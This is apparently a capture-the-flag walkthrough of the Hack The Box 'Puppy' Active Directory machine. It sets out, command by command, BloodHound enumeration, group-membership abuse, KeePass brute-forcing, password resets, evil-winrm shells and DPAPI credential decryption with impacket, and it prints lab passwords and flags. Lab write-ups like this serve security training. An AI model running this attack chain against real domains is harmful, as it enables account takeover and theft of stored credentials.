# Machine information

As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!
# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap -p- 10.129.217.5             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 18:49 CEST
Nmap scan report for 10.129.217.5
Host is up (0.025s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3260/tcp  open  iscsi
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49690/tcp open  unknown
60721/tcp open  unknown
60736/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 105.15 seconds
```

### Detailed port scan

At the detailed port scan go to get more information from the services who are open on the ip address.

```
nmap -p53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389 -sCV 10.129.217.5 -vvvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 18:53 CEST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:53
Completed NSE at 18:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:53
Completed NSE at 18:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:53
Completed NSE at 18:53, 0.00s elapsed
Initiating Ping Scan at 18:53
Scanning 10.129.217.5 [4 ports]
Completed Ping Scan at 18:53, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:53
Completed Parallel DNS resolution of 1 host. at 18:53, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 18:53
Scanning 10.129.217.5 [16 ports]
Discovered open port 111/tcp on 10.129.217.5
Discovered open port 135/tcp on 10.129.217.5
Discovered open port 3260/tcp on 10.129.217.5
Discovered open port 445/tcp on 10.129.217.5
Discovered open port 139/tcp on 10.129.217.5
Discovered open port 2049/tcp on 10.129.217.5
Discovered open port 464/tcp on 10.129.217.5
Discovered open port 53/tcp on 10.129.217.5
Discovered open port 593/tcp on 10.129.217.5
Discovered open port 88/tcp on 10.129.217.5
Discovered open port 3268/tcp on 10.129.217.5
Discovered open port 3269/tcp on 10.129.217.5
Discovered open port 9389/tcp on 10.129.217.5
Discovered open port 636/tcp on 10.129.217.5
Discovered open port 389/tcp on 10.129.217.5
Discovered open port 5985/tcp on 10.129.217.5
Completed SYN Stealth Scan at 18:53, 0.13s elapsed (16 total ports)
Initiating Service scan at 18:53
Scanning 16 services on 10.129.217.5
Completed Service scan at 18:55, 111.70s elapsed (16 services on 1 host)
NSE: Script scanning 10.129.217.5.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:55
NSE Timing: About 99.96% done; ETC: 18:55 (0:00:00 remaining)
Completed NSE at 18:56, 40.04s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:56
Completed NSE at 18:56, 29.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:56
Completed NSE at 18:56, 0.00s elapsed
Nmap scan report for 10.129.217.5
Host is up, received echo-reply ttl 127 (0.046s latency).
Scanned at 2025-05-19 18:53:35 CEST for 182s

Bug in iscsi-info: no string output.
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-19 23:55:12Z)
111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
2049/tcp open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3260/tcp open  iscsi?        syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        syn-ack ttl 127 .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53557/tcp): CLEAN (Timeout)
|   Check 2 (port 15127/tcp): CLEAN (Timeout)
|   Check 3 (port 55197/udp): CLEAN (Timeout)
|   Check 4 (port 14697/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 7h01m29s
| smb2-time: 
|   date: 2025-05-19T23:57:00
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:56
Completed NSE at 18:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:56
Completed NSE at 18:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:56
Completed NSE at 18:56, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.51 seconds
           Raw packets sent: 20 (856B) | Rcvd: 17 (732B)

```

I tried everything. I tried logging in to the smb server, I tried logging in to the windows machine by the credentials that that I got in the beginning of the machine but I could not log in to this. Then I tried to look for the enumerate of the windows machine but this did not work either.
Now I went to try to go get the data from the ldap server by using the credentials that that I was given and this I was able to do, I went to do this by doing the following command:


```
nxc ldap 10.129.217.5 -u 'levi.james' -p 'KingofAkron2025!' --bloodhound --collection All --dns-server 10.129.217.5
SMB         10.129.217.5    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
LDAP        10.129.217.5    389    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
LDAP        10.129.217.5    389    DC               Resolved collection methods: psremote, session, dcom, objectprops, rdp, acl, group, trusts, localadmin, container
LDAP        10.129.217.5    389    DC               Done in 00M 06S
LDAP        10.129.217.5    389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.217.5_2025-05-19_191822_bloodhound.zip
```

Now I will start uploading the data that I got on bloodhound. 
In bloodhound I searched for the user whose user creds I already have. Here I have seen that the user is a member of HR@puppy.htb where we have write permissions on the Developers@puppy.htb group.

![[Pasted image 20250519193233.png]]

The code below authenticates to the domain puppy.htb with the username levi.james and the password KingofAkron2025!  
Once logged in, the user levi.james is added to the Developers group.  

```
└─$ net rpc group addmem "Developers" "levi.james" -U "puppy.htb"/"levi.james"%'KingofAkron2025!' -S "puppy.htb" 
```

To check that the user has been added to the group you can use the following code.

```
net rpc group members "developers" -U "puppy.htb"/"levi.james"%'KingofAkron2025!' -S "puppy.htb"
PUPPY\levi.james
PUPPY\ant.edwards
PUPPY\adam.silver
PUPPY\jamie.williams
```

Since I now know that the user has been added to the developers group, I want to verify that I now have access to the DEV Shared drives. I do this by trying to log into the SMB server and view the shared folders. 

```
smbmap -H puppy.htb -u levi.james -p KingofAkron2025!                                                        

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

                                    
[+] IP: 10.129.217.5:445        Name: puppy.htb                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     READ ONLY       DEV-SHARE for PUPPY-DEVS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[-] Closing connections..                                                                                           [*] Closed 1 connections 
```

I have now started connecting to the dev drive of the smb server and in it you can find a keepass recovery.kdbx file in which there will be passwords.

```
smbclient \\\\puppy.htb\\DEV -U 'levi.james' 
Password for [WORKGROUP\levi.james]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 08:07:57 2025
  ..                                  D        0  Sat Mar  8 17:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 08:09:12 2025
  Projects                            D        0  Sat Mar  8 17:53:36 2025
  recovery.kdbx
```

I will start downloading the file by using the "get" command.

```
get recovery.kdbx
getting file \recovery.kdbx of size 2677 as recovery.kdbx (14.4 KiloBytes/sec) (average 14.4 KiloBytes/sec)
```

Before we can view the file we will first have to brute fofrce the password of the file. You can do this by downloading the following application. https://github.com/r3nt0n/keepass4brute
Once you have downloaded this application you can use the following code to brute force the password.

```
./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt 
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 166 - Estimated time remaining: 8 weeks, 4 days
[+] Current attempt: liverpool

[*] Password found: liverpool
```

Above you can see that the password of the file is liverpool. Now that I know the password of the file I can open the file by doing the following.

```
keepassxc recovery.kdbx
```

![[Pasted image 20250519201330.png]]

Within this file you can find the passwords of the different users. If we look in bloodhound we can see that the user ANT.EDWARDS@puppy.htb is a member of the Senior Devs groups and that they have GenericALL rights over adam.silver@puppy.htb.

![[Pasted image 20250519203143.png]]

Full control of a user allows you to modify properties of the user to perform a targeted kerberoast attack, and also grants the ability to reset the password of the user without knowing their current one.

```
python3 targetedKerberoast.py -v -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
```

I will use the following code to change the password of the user 'adam.silver' to “Test123”, by logging in with the user 'ant.edwards' (with password 'Antman2025!') on the server 'puppy.htb'.

```
┌──(kali㉿kali)-[~/HTB/Puppy/targetedKerberoast]
└─$ net rpc password 'adam.silver' "Test123" -U "puppy.htb"/"ant.edwards"%'Antman2025!' -S "puppy.htb"
```

The following command executes an LDAP command to change the userAccountControl attribute of the user ADAM. SILVER. It is done by making an LDAP connection to the server at IP address 10.129.217.5 and making the change.

This command connects to the LDAP server at IP 10.129.217.5 as user ant.edwards@puppy.htb, and changes the userAccountControl attribute of user ADAM.SILVER to 512.
This change probably causes the account to be activated or the account status to be changed.

```
echo -e "dn: CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB\nchangetype: modify\nreplace: userAccountControl\nuserAccountControl: 512" | ldapmodify -x -D "ant.edwards@puppy.htb" -w 'Antman2025!' -H ldap://10.129.217.5
modifying entry "CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB"
```

So now I will be able to log in to the windows machine, This by using evil-winrm.

```
evil-winrm -i 10.129.217.5 -u 'adam.silver' -p 'Test123                                        
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                       
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents>
```

user flag: 98b32b5cf932d25bf64a5afe7446d72f

```
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> cat user.txt
98b32b5cf932d25bf64a5afe7446d72f
```

Now that I have the user flag I will go and download winpeas on the windows machine so that I can find the bags in the machine. You can go and do this by doing the following on the windows machine.

```
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> upload winPEASx64.exe
                                        
Info: Uploading /home/kali/HTB/Puppy/winPEASx64.exe to C:\Users\adam.silver\Desktop\winPEASx64.exe
                                        
Data: 2625536 bytes of 2625536 bytes copied
                                        
Info: Upload successful!
```

I used the winpeas tool to check if there was something interesting on the machine. There i found out that there was a backup folder in the c drive. I went to look in this folder and there was a zip file in there, so I went to download it to my own machine.

Within the zip file I found user credentials for logging into the windows machine.

```
cat nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

Now I went to log in as the user steph.cooper with the password I just found in the file. So now I went to use the winpeas command on this user and came to the following discovery. Ik heb door winpeas te gebruiken een master key en Credential files van DPAPI gevonden.

DPAPI stands for Data Protection API and **it is not an encryption protocol**, but rather a cryptographic application programming interface (API) available in Windows operating systems. DPAPI enables developers to encrypt and decrypt data using symmetric keys derived from the user's logon secrets or the system's domain authentication secrets.

```
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> ./winPEASx64.exe

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:40:36 AM
    Modified: 3/8/2025 7:40:36 AM
=================================================================================================
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    CredFile: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 8:14:09 AM
    Modified: 3/8/2025 8:14:09 AM
    Size: 11068   =================================================================================================
    CredFile: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
    Description: Enterprise Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:54:29 AM
    Modified: 3/8/2025 7:54:29 AM
    Size: 414

```

By checking the following file I have seen that I can abuse these files. https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html

If you go and look at the directory from above you will see that there is nothing in this directory. This is because the file is hidden from us. However, you can go look at it by entering the following: 

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> ls -Hidden


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred
```

Now I will try to download this file to my own machine, but you will get an error code because there is a restriction on downloading hidden files. To do this you must first make the file visible by executing the following command.

```
attrib -S -H 'C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407'
```

As you will now be able to see below, you can download the file and so it is no longer hidden from us.

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> ls


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407


*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> download 556a2412-1275-4ccf-b721-e6a0b4f90407
                                        
Info: Downloading C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 to 556a2412-1275-4ccf-b721-e6a0b4f90407
                                        
Info: Download successful!
```

In the command below I will use a python application to decrypt the masterkey of the Masterkey file that I will use after it to find the Credential file its password. 

For this I have used the following application. https://github.com/fortra/impacket/blob/master/examples/dpapi.py

```
dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

Now that I have decrypted the master key, I can go and decrypt the credential file by using the file from the following path that I found with winpeas. C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
From this we will get the credentials that that we can use afterwards to log in to the windows machine.

```                                   
┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

Log in as Steph.coopers his administrator account by the credentials I found above.

| Username         | Password                |
| ---------------- | ----------------------- |
| steph.cooper_adm | FivethChipOnItsWay2025! |

```
evil-winrm -i 10.129.13.208 -u steph.cooper_adm -p FivethChipOnItsWay2025!
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents>
```

Now I can search for the root flag because this user is a member of the local group Administrators.

```
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> net user steph.cooper_adm
User name                    steph.cooper_adm
Full Name                    Stephen A. Cooper
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/8/2025 8:50:40 AM
Password expires             Never
Password changeable          3/9/2025 8:50:40 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.
```

Root flag: 7b0e5198492771c2fa32157d00937934

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
7b0e5198492771c2fa32157d00937934
```

![[Pasted image 20250519233427.png]]